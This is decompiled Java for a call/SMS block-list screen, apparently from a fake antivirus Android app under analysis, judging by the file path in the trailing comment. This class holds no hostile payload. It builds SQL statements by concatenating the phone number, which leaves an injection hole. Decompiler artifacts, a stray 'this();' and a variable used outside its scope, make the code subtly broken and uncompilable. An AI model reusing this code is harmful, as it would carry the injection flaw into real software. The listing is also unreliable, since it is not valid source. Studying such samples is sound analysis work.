package com.example.androiddefender2;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.view.Menu;
import android.view.View;
import android.widget.CheckBox;
import android.widget.TextView;
import com.worker.androiddefender2.SystemFunctions;
import system.AppSingleton;

public class BlackList extends CustomActGroup {
  private static final int PICK_CONTACT = 1;
  
  protected AppSingleton as;
  
  protected TextView edtPhoneNumber;
  
  private String getContactPhone(String paramString) {
    Cursor cursor = managedQuery(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = ?", new String[] { paramString }, null);
    if (cursor.moveToFirst()) {
      paramString = cursor.getString(cursor.getColumnIndex("data1"));
      if (paramString == null) {
        cursor.close();
        return null;
      } 
      cursor.close();
      return paramString;
    } 
    cursor.close();
    return null;
  }
  
  public void btnNumbersList_Click(View paramView) {
    startActivity(new Intent((Context)this, NumbersList.class));
  }
  
  public void getContactNumber_Click(View paramView) {
    Intent intent = new Intent("android.intent.action.GET_CONTENT");
    intent.setType("vnd.android.cursor.item/phone_v2");
    getParent().startActivityForResult(intent, 1);
  }
  
  protected void onActivityResult(int paramInt1, int paramInt2, Intent paramIntent) {
    super.onActivityResult(paramInt1, paramInt2, paramIntent);
    if (paramIntent != null) {
      Uri uri = paramIntent.getData();
      if (uri != null) {
        Cursor cursor;
        paramIntent = null;
        try {
          Cursor cursor1 = getContentResolver().query(uri, new String[] { "data1", "data2" }, null, null, null);
          if (cursor1 != null) {
            cursor = cursor1;
            if (cursor1.moveToFirst()) {
              cursor = cursor1;
              String str = cursor1.getString(0);
              cursor = cursor1;
              cursor1.getInt(1);
              cursor = cursor1;
              this.edtPhoneNumber.setText(SystemFunctions.prepareNumber(str));
            } 
          } 
          return;
        } finally {
          if (cursor != null)
            cursor.close(); 
        } 
      } 
    } 
  }
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903040);
    this.edtPhoneNumber = (TextView)findViewById(2131296269);
    this.edtPhoneNumber.clearFocus();
    this.as = AppSingleton.getInstance();
    this.as.getDB(getApplicationContext());
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu) {
    getMenuInflater().inflate(2131230720, paramMenu);
    return true;
  }
  
  public void sendToBlack_Click(View paramView) {
    String str = SystemFunctions.prepareNumber(this.edtPhoneNumber.getText().toString());
    CheckBox checkBox1 = (CheckBox)findViewById(2131296261);
    CheckBox checkBox2 = (CheckBox)findViewById(2131296263);
    if (str != null && !str.isEmpty() && (checkBox1.isChecked() || checkBox2.isChecked())) {
      String str1 = "SELECT * FROM black_list WHERE number = '" + str + "'";
      if (!this.as.mainDB.checkIssetSQLOneRow(str1)) {
        try {
          StringBuilder stringBuilder = new StringBuilder();
          this();
          String str2 = stringBuilder.append("INSERT INTO black_list (number, call, sms) VALUES ('").append(str).append("', ").append("'").append(checkBox1.isChecked()).append("', ").append("'").append(checkBox2.isChecked()).append("')").toString();
          this.as.mainDB.ExecuteSQLScript(this.as.mainDB.getWritableDatabase(), str2);
          SystemFunctions.getDialog(getResources().getString(2131099767), String.format(getResources().getString(2131099768), new Object[] { str }), (Context)getParent().getParent());
          this.edtPhoneNumber.setText(getResources().getString(2131099659));
          checkBox1.setChecked(false);
          checkBox2.setChecked(false);
        } catch (Exception exception) {
          SystemFunctions.getDialog(getResources().getString(2131099769), exception.toString(), (Context)getParent().getParent());
        } 
        return;
      } 
      SystemFunctions.getDialog(getResources().getString(2131099770), String.format(getResources().getString(2131099771), new Object[] { exception }), (Context)getParent().getParent());
      return;
    } 
    SystemFunctions.getDialog(getResources().getString(2131099772), getResources().getString(2131099773), (Context)getParent().getParent());
  }
  
  public void showSelectedNumber(int paramInt, String paramString) {
    this.edtPhoneNumber.setText(paramInt + ": " + paramString);
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/BlackList.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */